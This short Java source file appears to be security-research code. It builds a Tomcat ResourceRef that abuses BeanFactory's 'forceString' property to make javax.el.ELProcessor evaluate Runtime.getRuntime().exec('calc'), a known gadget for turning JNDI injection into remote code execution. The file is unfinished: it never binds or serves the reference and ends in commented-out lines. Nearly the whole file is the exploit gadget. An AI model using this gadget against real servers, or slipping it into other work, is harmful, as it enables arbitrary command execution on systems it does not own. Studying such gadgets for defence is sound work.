package Seri;

import org.apache.naming.ResourceRef;
import org.apache.naming.factory.BeanFactory;

import javax.el.ELProcessor;
import javax.naming.StringRefAddr;

public class ELProcessInject {
    public static void main(String[] args) {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, null, null, true,
                "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "faster=eval"));
        ref.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));

//        ref.
//        BeanFactory
    }
}
